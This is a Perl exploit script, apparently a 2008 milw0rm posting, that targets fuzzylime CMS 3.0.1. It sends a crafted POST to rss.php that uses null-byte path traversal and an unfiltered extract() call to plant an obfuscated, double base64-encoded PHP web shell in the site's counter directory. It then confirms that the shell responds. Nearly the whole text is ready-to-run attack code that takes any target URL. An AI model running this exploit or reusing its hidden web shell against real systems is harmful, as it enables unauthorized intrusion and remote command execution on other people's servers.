#!/usr/bin/perl
#
# fuzzylime 3.0.1 Perl exploit
#
# discovered & written by Ams
# ax330d@gmail.com
#
# DESCRIPTION:
# There are availability to load files through script
# rss.php, and also there are unfiltered extract(); usage.
# This exploit creates shell in /code/counter/middle_index_inc.php
#
# USAGE:
# Run exploit: perl expl.pl http://www.site.com
#
# NEEDED:
# magic_quotes_gpc=off
#

use strict;
use IO::Socket;

print "\n\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	\n\t\t fuzzlyime 3.0.1 exploit
	\n\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n";

if(@ARGV<1){
	die "\n\tUsage:\texpl.pl url\n\n
	\n\tExample:\texpl.pl http://localhost/path/\n\n";
}

my $expl_url=$ARGV[0];
my $shell=q~
<?php
$shell='YVhOelpYUW9KRjlRVDFOVVd5ZHdhSEJwYm1adkoxMHBQMlJwWlNod2FIQnBibVp2S0NrcE9qQTdDaVJsY2owbkp6c2tjMjA5Snp4a2FYWWdZMnhoYzNNOUltNW1ieUkrU1c1bWJ6cGJjMkZtWlY5dGIyUmxQU2N1YVc1cFgyZGxkQ2duYzJGbVpWOXRiMlJsSnlrdUoxMG1ibUp6Y0R0YloyeHZZbUZzY3owbkxtbHVhVjluWlhRb0ozSmxaMmx6ZEdWeVgyZHNiMkpoYkhNbktTNG5YU1p1WW5Od08xdHRZV2RwWTE5eGRXOTBaWE5mWjNCalBTY3VhVzVwWDJkbGRDZ25iV0ZuYVdOZmNYVnZkR1Z6WDJkd1l5Y3BMaWRkSm01aWMzQTdXMlJwYzJGaWJHVmtYMloxYm1OMGFXOXVjejBuTG1sdWFWOW5aWFFvSjJScGMyRmliR1ZrWDJaMWJtTjBhVzl1Y3ljcExpZGRKbTVpYzNBN1BHSnlMejViY0dod09pY3VjR2h3ZG1WeWMybHZiaWdwTGlkZEptNWljM0E3VzNWelpYSTZKeTVuWlhSZlkzVnljbVZ1ZEY5MWMyVnlLQ2t1SjEwbWJtSnpjRHM4WW5JdlBsdDFibUZ0WlRvbkxuQm9jRjkxYm1GdFpTZ3BMaWRkSm01aWMzQTdQQzlrYVhZK1BHSnlMejRuT3dwcFppaHBjM05sZENna1gxQlBVMVJiSjNObGRDZGRLU2w3YVdZb2FYTnpaWFFvSkY5R1NVeEZVMXNuWm1rblhTa3BJR2xtS0NGQWJXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUmZSa2xNUlZOYkoyWnBKMTFiSjNSdGNGOXVZVzFsSjEwc0pGOUdTVXhGVTFzblpta25YVnNuYm1GdFpTZGRLU2tnSkhOdExqMG5QSE53WVc0Z1kyeGhjM005SW1WeWNtOXlJajVEYjNWc1pDQnViM1FnYlc5MlpTQjFjR3h2WVdSbFpDQm1hV3hsSVR3dmMzQmhiajRuT3dwcFppaHBjM05sZENna1gxQlBVMVJiSjJWMllXd25YU2twZTI5aVgzTjBZWEowS0NrN1pYWmhiQ2drWDFCUFUxUmJKMlYyWVd3blhTazdKSE50TGoxdllsOW5aWFJmWTJ4bFlXNG9LVHQ5Q21semMyVjBLQ1JmVUU5VFZGc25aWGhsWXlkZEtUOGtjMjB1UFNjOGNISmxQaWN1WUNSZlVFOVRWRnRsZUdWalhXQXVKend2Y0hKbFBpYzZNRHQ5Q21WamFHOGdKenhvZEcxc1BqeG9aV0ZrUGp4MGFYUnNaVDR1TGk1MFpXMXdiM0poY25rZ2MyaGxiR3d1TGk0OEwzUnBkR3hsUGp4dFpYUmhJR2gwZEhBdFpYRjFhWFk5SWtOdmJuUmxiblF0Vkhsd1pTSWdZMjl1ZEdWdWREMGlkR1Y0ZEM5b2RHMXNPeUJqYUdGeWMyVjBQWGRwYm1SdmQzTXRNVEkxTVNJdlBnbzhjM1I1YkdVZ2RIbHdaVDBpZEdWNGRDOWpjM01pUGdwaWIyUjVlMlp2Ym5RdFptRnRhV3g1T25abGNtUmhibUVzWVhKcFlXd3NjMlZ5YVdZN1ltRmphMmR5YjNWdVpDMWpiMnh2Y2pvak16TXpPMk52Ykc5eU9pTm1PV1k1WmprN1ptOXVkQzF6YVhwbE9qRXdjSGc3ZlFvdVltOTRlMkp2Y21SbGNqb3hjSGdnYzI5c2FXUWdJMk5qWXp0aVlXTnJaM0p2ZFc1a0xXTnZiRzl5T2lNek16TTdiV0Z5WjJsdU9tRjFkRzg3YldGeVoybHVMWFJ2Y0RvME1IQjRPM0JoWkdScGJtYzZNVEJ3ZUR0M2FXUjBhRG8wTURCd2VEdDlDaTV1Wm05N1ltOXlaR1Z5T2pGd2VDQnpiMnhwWkNBak9UazVPMkpoWTJ0bmNtOTFibVF0WTI5c2IzSTZJelkyTmp0d1lXUmthVzVuT2pWd2VEdDlDbWx1Y0hWMGUyMWhjbWRwYmpveWNIZzdmUW84TDNOMGVXeGxQand2YUdWaFpENDhZbTlrZVQ0OFpHbDJJR05zWVhOelBTSmliM2dpUGljdUpITnRMaWNLUEdadmNtMGdaVzVqZEhsd1pUMGliWFZzZEdsd1lYSjBMMlp2Y20wdFpHRjBZU0lnWVdOMGFXOXVQU0lpSUcxbGRHaHZaRDBpY0c5emRDSStDanh3UGp4cGJuQjFkQ0IwZVhCbFBTSnpkV0p0YVhRaUlHNWhiV1U5SW5Cb2NHbHVabThpSUhaaGJIVmxQU0p3YUhCcGJtWnZJaTgrUEM5d1BncDFjR3h2WVdRNlBHbHVjSFYwSUhSNWNHVTlJbVpwYkdVaUlHNWhiV1U5SW1acElpOCtQR0p5THo0S1kyMWtPaVp1WW5Od096eHBibkIxZENCMGVYQmxQU0owWlhoMElpQnVZVzFsUFNKbGVHVmpJaUIyWVd4MVpUMGlJaTgrUEdKeUx6NEtaWFpoYkRvbWJtSnpjRHM4YVc1d2RYUWdkSGx3WlQwaWRHVjRkQ0lnYm1GdFpUMGlaWFpoYkNJZ2RtRnNkV1U5SWlJdlBqeGljaTgrUEhBK0NqeHBibkIxZENCMGVYQmxQU0p6ZFdKdGFYUWlJRzVoYldVOUluTmxkQ0lnZG1Gc2RXVTlJazlySWk4K1BDOXdQZ284TDJadmNtMCtQQzlrYVhZK1BDOWliMlI1UGp3dmFIUnRiRDRuT3c9PQ==';
eval(base64_decode(base64_decode($shell)));
?>
~;
my $shell_name='middle_index.inc.php';

print "\tStarting exploit...\n";
if($expl_url=~m#http://#){
	exploit($expl_url);
} else {
	exploit('http://'.$expl_url);
}

sub exploit {
	#	Defining...
	my $site=pop @_;
	(my $a,my $b,my $c,my @d)=split /\//,$site;
	my $path=join('/',@d);
	my $host=$c;
	if($path) {$path='/'.$path;}
	my $injection="p=../code/content.php%00&s=$shell_name%00&curcount=$shell";
	my $length=length($injection);

	#	Injecting...
	my $socket=IO::Socket::INET->new(
		Proto=>"tcp",
		PeerAddr=>$host,
		PeerPort=>"80"
	);
	if( ! $socket){
		die("\n\tUnable to connect to http://$host\n\n");
	} else {
		
		my $packet = "POST $path/rss.php HTTP/1.1\r\n";
		$packet .= "Host: $host\r\n";
		$packet .= "Connection: Close\r\n";
		$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
		$packet .= "Content-Length: $length\r\n\r\n";
		$packet .= "$injection";
		print $socket $packet;
		close($socket);
	}
	sleep(1);
	#	Checking for shell...
	$socket=IO::Socket::INET->new(
		Proto=>"tcp",
		PeerAddr=>$host,
		PeerPort=>"80"
	);
	if( ! $socket){
		die("\n\tUnable to connect to http://$host (check shell yourself)\n\n");
	} else {
		my $packet = "POST $path/code/counter/$shell_name HTTP/1.1\r\n";
		$packet .= "Host: $host\r\n";
		$packet .= "Connection: Close\r\n\r\n";
		print $socket $packet;

		my $rcv;
		my $dat='';
		while($rcv=<$socket>){
			$dat.=$rcv;
		}
		if ($dat =~ /200 OK/){
			print "\n\t$site\t[OK]\n\n";
		} else {
			print "\n\t$site\t[FAIL]\n\n";
		}
		close($socket);
	}
}

# milw0rm.com [2008-07-05]
